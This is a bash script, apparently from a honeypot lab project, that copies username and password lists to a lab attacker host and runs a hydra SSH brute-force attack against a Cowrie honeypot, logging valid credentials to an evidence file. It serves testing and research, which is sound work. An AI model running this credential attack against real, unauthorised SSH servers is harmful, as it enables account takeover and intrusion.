#!/usr/bin/env bash
# a repeatable hydra credential attack from the attacker against a honeypot
# the count is deterministic, users times passwords, against ap-cowrie's committed userdb
set -euo pipefail

ATTACKER="${ATTACKER:-10.10.10.20}"
ATTACKER_USER="${ATTACKER_USER:-apiary}"
TARGET="${TARGET:-}"
PORT="${PORT:-2222}"
TASKS="${TASKS:-1}"
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
OUT="${OUT:-docs/evidence/creds.txt}"

[[ -n "$TARGET" ]] || { echo "set TARGET to the honeypot address"; exit 1; }

# the lists go to the attacker once, then hydra runs there in a single invocation
scp -o BatchMode=yes "$ROOT/scripts/attack/users.txt" "$ROOT/scripts/attack/passwords.txt" \
  "$ATTACKER_USER@$ATTACKER:/tmp/" >/dev/null

cmd="hydra -L /tmp/users.txt -P /tmp/passwords.txt -s $PORT -t $TASKS ssh://$TARGET"
echo "# $cmd" | tee "$OUT"
ssh -o BatchMode=yes "$ATTACKER_USER@$ATTACKER" "$cmd" 2>&1 \
  | grep -E 'login tries|host:|valid password' | tee -a "$OUT"
